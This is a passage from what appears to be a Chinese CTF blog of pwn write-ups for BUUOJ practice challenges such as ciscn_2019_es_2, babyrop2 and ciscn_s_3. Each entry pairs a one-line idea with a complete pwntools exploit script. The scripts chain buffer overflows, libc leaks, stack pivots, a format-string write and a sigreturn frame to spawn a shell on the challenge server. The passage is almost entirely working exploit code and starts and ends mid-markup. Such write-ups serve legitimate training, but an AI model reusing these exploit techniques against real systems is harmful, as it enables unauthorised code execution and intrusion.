elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>gets_got = elf.got[<span class="hljs-string">&#x27;gets&#x27;</span>]<br><br>pop_rdi = <span class="hljs-number">0x400c83</span><br>ret = <span class="hljs-number">0x4006b9</span><br>encrypt = <span class="hljs-number">0x4009a0</span><br><br>puts_offset = <span class="hljs-number">0x0809c0</span><br>system_offset = <span class="hljs-number">0x04f440</span><br>binsh_offset = <span class="hljs-number">0x1b3e9a</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;Input your choice!&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span>+<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">87</span><br>payload+= p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(encrypt)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;Input your Plaintext to be encrypted&#x27;</span>)<br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">b&quot;Ciphertext&quot;</span>)<br>puts_addr = u64(p.recv(<span class="hljs-number">8</span>)[<span class="hljs-number">2</span>:<span class="hljs-number">8</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br>info(<span class="hljs-built_in">hex</span>(puts_addr))<br><br>libc_base = puts_addr - puts_offset<br>system_addr = libc_base + system_offset<br>binsh_addr = libc_base + binsh_offset<br><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span>+<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">87</span><br>payload+= p64(pop_rdi)+p64(binsh_addr)+p64(ret)+p64(system_addr)<br><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h2><h3 id="思路-19"><a href="#思路-19" class="headerlink" title="思路"></a>思路</h3><p>32位传参</p><h3 id="exp-17"><a href="#exp-17" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">29664</span>)<br><span class="hljs-comment">#p = process(&quot;./ciscn_2019_ne_5&quot;)</span><br><br>system_addr = <span class="hljs-number">0x080484D0</span><br>main = <span class="hljs-number">0x08048722</span><br>binsh = <span class="hljs-number">0x080482ea</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">overflow</span>(<span class="hljs-params">payload</span>):<br>    p.recvuntil(<span class="hljs-string">b&#x27;password&#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;administrator&#x27;</span>)<br><br>    p.recvuntil(<span class="hljs-string">b&#x27;operation&#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br><br>    p.recvuntil(<span class="hljs-string">b&#x27;info&#x27;</span>)<br>    p.sendline(payload)<br><br>    p.recvuntil(<span class="hljs-string">b&#x27;operation&#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;4&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">76</span> + p32(system_addr) + p32(main) + p32(binsh)<br><br>overflow(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h2><h3 id="思路-20"><a href="#思路-20" class="headerlink" title="思路"></a>思路</h3><p>ret2libc</p><h3 id="exp-18"><a href="#exp-18" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">28035</span>)<br><span class="hljs-comment">#p = process(&quot;./2018_rop&quot;)</span><br>elf = ELF(<span class="hljs-string">&quot;./2018_rop&quot;</span>)<br><br>write_plt = elf.plt[<span class="hljs-string">&quot;write&quot;</span>]<br>write_got = elf.got[<span class="hljs-string">&quot;write&quot;</span>]<br>main = <span class="hljs-number">0x080484C6</span><br><br>payload1 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">140</span> + p32(write_plt) + p32(main) + p32(<span class="hljs-number">1</span>) + p32(write_got) + p32(<span class="hljs-number">4</span>)<br>p.sendline(payload1)<br>p.recv(<span class="hljs-number">4</span>)<br>p.sendline(payload1)<br>write_addr = u32(p.recv(<span class="hljs-number">4</span>))<br><br>info(<span class="hljs-built_in">hex</span>(write_addr))<br><br>system_addr = write_addr - <span class="hljs-number">0xa89e0</span><br>binsh = write_addr + <span class="hljs-number">0x961df</span><br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">140</span>+p32(system_addr) + p32(main) + p32(binsh)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a>bjdctf_2020_babystack2</h2><h3 id="思路-21"><a href="#思路-21" class="headerlink" title="思路"></a>思路</h3><p>有个有符号整数与无符号整数的转换漏洞</p><h3 id="exp-19"><a href="#exp-19" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">25144</span>)<br><span class="hljs-comment">#p = process(&quot;./bjdctf_2020_babystack2&quot;)</span><br><br>backdoor = <span class="hljs-number">0x400726</span><br><br>p.recvuntil(<span class="hljs-string">b&quot;name:&quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;-1&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">16</span>+<span class="hljs-number">8</span>) + p64(backdoor) <br>p.recvuntil(<span class="hljs-string">b&quot;name?&quot;</span>)<br><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h2><h2 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h2><h3 id="思路-22"><a href="#思路-22" class="headerlink" title="思路"></a>思路</h3><p>格式化字符串漏洞</p><h3 id="exp-20"><a href="#exp-20" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = process(&quot;./fm&quot;)</span><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">29687</span>)<br>x_addr = <span class="hljs-number">0x0804A02C</span><br><br>payload = p32(x_addr) + <span class="hljs-string">b&#x27;%11$n&#x27;</span><br><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="jarvisoj-tell-me-something"><a href="#jarvisoj-tell-me-something" class="headerlink" title="jarvisoj_tell_me_something"></a>jarvisoj_tell_me_something</h2><h2 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h2><h3 id="思路-23"><a href="#思路-23" class="headerlink" title="思路"></a>思路</h3><p>栈迁移<br>利用第一次输出泄露调用vuln函数时压入的ebp，即main_ebp<br>构造 <code>b&#39;AAAA&#39; + p32(system_plt) + p32(main) + p32(main_ebp-offset) + b&#39;/bin/sh&#39;</code><br>调试获取main_ebp与’&#x2F;bin&#x2F;sh’的偏移offset<br>最后利用两次leave_ret转移esp，第一次是程序中的leave，用于转移ebp;第二次是leave_ret的gadget，这次会转移esp</p><h3 id="exp-21"><a href="#exp-21" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">26700</span>)<br><span class="hljs-comment">#p = process(&quot;./ciscn_2019_es_2&quot;)</span><br><br>system_plt = <span class="hljs-number">0x08048400</span><br>lev_ret = <span class="hljs-number">0x080485FD</span><br>main = <span class="hljs-number">0x080485FF</span><br><br><span class="hljs-comment">#gdb.attach(p)</span><br><br>payload1 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x8</span><br>p.send(payload1)<br>p.recvuntil(<span class="hljs-string">b&#x27;BBBBBBBB&#x27;</span>)<br>main_ebp = u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-comment">#info(hex(main_ebp))</span><br><br>payload2 = <span class="hljs-string">b&#x27;AAAA&#x27;</span> + p32(system_plt) + p32(main) + p32(main_ebp-<span class="hljs-number">0x28</span>) + <span class="hljs-string">b&#x27;/bin/sh&#x27;</span><br>payload2 = payload2.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload2+= p32(main_ebp-<span class="hljs-number">0x38</span>) + p32(lev_ret)<br>p.send(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="HarekazeCTF2019-baby_rop2"></a>HarekazeCTF2019-baby_rop2</h2><h3 id="思路-24"><a href="#思路-24" class="headerlink" title="思路"></a>思路</h3><p>ret2libc</p><h3 id="exp-22"><a href="#exp-22" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#context.log_level = &quot;debug&quot;</span><br><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">25568</span>)<br><span class="hljs-comment">#p = process(&quot;./babyrop2&quot;)</span><br>elf = ELF(<span class="hljs-string">&quot;./babyrop2&quot;</span>)<br><br>printf_plt = elf.plt[<span class="hljs-string">&quot;printf&quot;</span>]<br>printf_got = elf.got[<span class="hljs-string">&quot;printf&quot;</span>]<br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>main = <span class="hljs-number">0x400636</span><br><br>pop_rdi = <span class="hljs-number">0x400733</span><br>pop_rsi_r15 = <span class="hljs-number">0x400731</span><br>ret = <span class="hljs-number">0x400734</span><br><br>format_s = <span class="hljs-number">0x400790</span><br><br><span class="hljs-comment">#gdb.attach(p)</span><br><br>payload1 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">40</span> + p64(pop_rdi) + p64(format_s) +p64(pop_rsi_r15) + p64(read_got) + p64(<span class="hljs-number">0</span>) + p64(printf_plt) + p64(main) + <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">8</span><br>p.recvuntil(<span class="hljs-string">b&quot;name? &quot;</span>)<br>p.sendline(payload1)<br>read_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(read_addr))<br><br>system_addr = read_addr - <span class="hljs-number">0xb1ec0</span><br>binsh = read_addr + <span class="hljs-number">0x95b07</span><br><br>payload2 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">40</span> + p64(pop_rdi) + p64(binsh) + p64(system_addr)<br>p.sendline(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h2><h3 id="思路-25"><a href="#思路-25" class="headerlink" title="思路"></a>思路</h3><p>ret2libc<br>这次用的LibcSearcher找libc</p><h3 id="exp-23"><a href="#exp-23" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">29615</span>)<br><span class="hljs-comment">#p = process(&quot;./pwn2_sctf_2016&quot;)</span><br>elf = ELF(<span class="hljs-string">&quot;./pwn2_sctf_2016&quot;</span>)<br><br>printf_plt = elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>printf_got = elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>main = <span class="hljs-number">0x080485B8</span><br>call_printf = <span class="hljs-number">0x080485B0</span><br>format_s = <span class="hljs-number">0x08048702</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;read? &#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;-1&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">47</span> + <span class="hljs-string">b&#x27;B&#x27;</span> + p32(printf_plt) + p32(main) + p32(format_s) + p32(printf_got)<br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;B&#x27;</span>)<br>printf_addr = u32(p.recv()[<span class="hljs-number">17</span>:<span class="hljs-number">21</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(printf_addr))<br><br>libc = LibcSearcher(<span class="hljs-string">&quot;printf&quot;</span>,printf_addr)<br><br>printf_offset = libc.dump(<span class="hljs-string">&#x27;printf&#x27;</span>)<br>system_offset = libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh_offset = libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>libc_base = printf_addr - printf_offset<br>system_addr = libc_base + system_offset<br>binsh = libc_base + binsh_offset<br><br>p.sendline(<span class="hljs-string">b&#x27;-1&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">48</span> + p32(system_addr) + p32(main) + p32(binsh)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="picoctf-2018-rop-chain"><a href="#picoctf-2018-rop-chain" class="headerlink" title="picoctf_2018_rop_chain"></a>picoctf_2018_rop_chain</h2><h3 id="思路-26"><a href="#思路-26" class="headerlink" title="思路"></a>思路</h3><p>达成几个条件即可获取flag</p><h3 id="exp-24"><a href="#exp-24" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = process(&#x27;./PicoCTF_2018_rop_chain&#x27;)</span><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">29755</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./PicoCTF_2018_rop_chain&#x27;</span>)<br>gets_plt = elf.plt[<span class="hljs-string">&#x27;gets&#x27;</span>]<br><br>win1 = <span class="hljs-number">0x0804A041</span><br>win2 = <span class="hljs-number">0x0804A042</span><br>flag = <span class="hljs-number">0x0804862B</span><br>a1 = <span class="hljs-number">0xDEADBAAD</span><br>main = <span class="hljs-number">0x0804873B</span><br><br>pop_ebx = <span class="hljs-number">0x804840d</span><br><br>payload1 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">28</span> + p32(gets_plt) + p32(main) + p32(win1) <br>p.recvuntil(<span class="hljs-string">b&quot;input&gt; &quot;</span>)<br>p.sendline(payload1)<br>p.sendline(<span class="hljs-string">b&#x27;\x01\x01&#x27;</span>)<br><br>payload2 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">28</span> + p32(flag) + p32(main) + p32(a1)<br>p.recvuntil(<span class="hljs-string">b&#x27;input&gt; &#x27;</span>)<br>p.sendline(payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="jarvisoj-level3"><a href="#jarvisoj-level3" class="headerlink" title="jarvisoj_level3"></a>jarvisoj_level3</h2><h2 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h2><h3 id="思路-27"><a href="#思路-27" class="headerlink" title="思路"></a>思路</h3><p>泄露栈上的地址，计算偏移，构造’&#x2F;bin&#x2F;sh’字符串<br>之后有两个思路</p><ol><li>利用ROPgadget布置寄存器获取shell</li><li>利用sigreturn布置寄存器获取shell</li></ol><h3 id="exp-25"><a href="#exp-25" class="headerlink" title="exp"></a>exp</h3><h4 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br>p = process(<span class="hljs-string">&#x27;./ciscn_s_3&#x27;</span>)<br><span class="hljs-comment">#p = remote(&quot;node5.buuoj.cn&quot;,29806)</span><br><br>mov_rax_59 = <span class="hljs-number">0x4004e3</span><br>mov_addr = <span class="hljs-number">0x400580</span><br>pop_addr = <span class="hljs-number">0x40059A</span><br>syscall = <span class="hljs-number">0x400517</span><br>vuln = <span class="hljs-number">0x4004ed</span><br>ret = <span class="hljs-number">0x400538</span><br>pop_rdi = <span class="hljs-number">0x4005a3</span><br><br><span class="hljs-comment">#gdb.attach(p)</span><br><br>payload1 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">16</span><br>payload1+= p64(vuln)<br>p.send(payload1)<br><br><span class="hljs-comment">#print(p.recv())</span><br><br>p.recv(<span class="hljs-number">32</span>)<br>leak=u64(p.recv(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(leak))<br>binsh = leak - <span class="hljs-number">0x148</span><br>ret_addr = binsh + <span class="hljs-number">8</span><br><br>payload2 = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(ret)+p64(pop_addr)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)+p64(ret_addr)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)<br>payload2+=p64(mov_addr)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">7</span>*<span class="hljs-number">8</span> + p64(mov_rax_59) +p64(pop_rdi) + p64(binsh) + p64(syscall)<br>p.sendline(payload2)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h4 id="srop"><a href="#srop" class="headerlink" title="srop"></a>srop</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>p = process(<span class="hljs-string">&#x27;./ciscn_s_3&#x27;</span>)<br><span class="hljs-comment">#p = remote(&quot;node5.buuoj.cn&quot;,28047)</span><br><br>mov_rax_15 = <span class="hljs-number">0x4004DA</span><br>mov_rax_59 = <span class="hljs-number">0x4004e3</span><br>mov_addr = <span class="hljs-number">0x400580</span><br>pop_addr = <span class="hljs-number">0x40059A</span><br>syscall = <span class="hljs-number">0x400517</span><br>vuln = <span class="hljs-number">0x4004ed</span><br>ret = <span class="hljs-number">0x400538</span><br>pop_rdi = <span class="hljs-number">0x4005a3</span><br><br><span class="hljs-comment">#gdb.attach(p)</span><br><br>payload1 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">16</span><br>payload1+= p64(vuln)<br>p.send(payload1)<br><br><span class="hljs-comment">#print(p.recv())</span><br><br>p.recv(<span class="hljs-number">32</span>)<br>leak=u64(p.recv(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(leak))<br>binsh = leak - <span class="hljs-number">0x118</span><br><br>sigframe = SigreturnFrame()<br>sigframe.rax = constants.SYS_execve<br>sigframe.rdi = binsh<br>sigframe.rsi = <span class="hljs-number">0</span><br>sigframe.rdx = <span class="hljs-number">0</span><br>sigframe.rip = syscall<br><br>payload2 = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="hljs-number">16</span>,<span class="hljs-string">b&#x27;A&#x27;</span>) + p64(mov_rax_15) + p64(syscall) + <span class="hljs-built_in">bytes</span>(sigframe)<br>p.sendline(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h2><h2 id="wustctf2020-getshell"><a href="#wustctf2020-getshell" class="headerlink" title="wustctf2020_getshell"></a>wustctf2020_getshell</h2><h3 id="exp-26"><a href="#exp-26" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = process(&quot;./wustctf2020_getshell&quot;)</span><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">25919</span>)<br><br>shell = <span class="hljs-number">0x0804851B</span><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">28</span> + p32(shell)<br><br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="jarvisoj-level3-x64"><a href="#jarvisoj-level3-x64" class="headerlink" title="jarvisoj_level3_x64"></a>jarvisoj_level3_x64</h2><h2 id="babyheap-0ctf-2017"><a href="#babyheap-0ctf-2017" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h2><h2 id="actf-2019-babyheap"><a href="#actf-2019-babyheap" class="headerlink" title="actf_2019_babyheap"></a>actf_2019_babyheap</h2><h3 id="思路-28"><a href="#思路-28" class="headerlink" title="思路"></a>思路</h3><p>堆入门题，UAF漏洞</p><h3 id="exp-27"><a href="#exp-27" class="headerlink" 